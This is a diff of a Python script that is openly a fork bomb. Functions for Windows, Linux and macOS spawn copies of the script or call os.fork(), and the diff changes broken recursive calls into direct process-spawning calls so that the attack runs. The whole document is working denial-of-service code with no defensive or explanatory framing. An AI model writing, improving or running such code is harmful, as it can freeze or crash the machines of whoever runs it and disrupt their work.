@@ -1,3 +1,4 @@
+## -*- coding: utf-8 -*-
 #!/usr/bin/env python3
 
 ## >>
@@ -26,21 +27,21 @@ def forkbombwin(i):
     subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
     while i != 6:
         i += 1
-        forkbombwin()
+        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         if i == 6:
             break
 def forkbomblin(i):
     os.fork()
     while i != 6:
         i += 6
-        forkbomblin()
+        os.fork()
         if i == 6:
             break
 def forkbombmac(i):
     os.fork()
     while i != 6:
         i += 6
-        forkbombmac()
+        os.fork()
         if i == 6:
             break
 ## >>
@@ -48,8 +49,8 @@ def forkbombmac(i):
 ## >>
 
 if opsys == "Windows":
-    forkbombwin()
+    forkbombwin(i)
 if opsys == "Linux":
-    forkbomblin()
+    forkbomblin(i)
 if opsys == "Darwin":
-    forkbombmac()
+    forkbombmac(i)
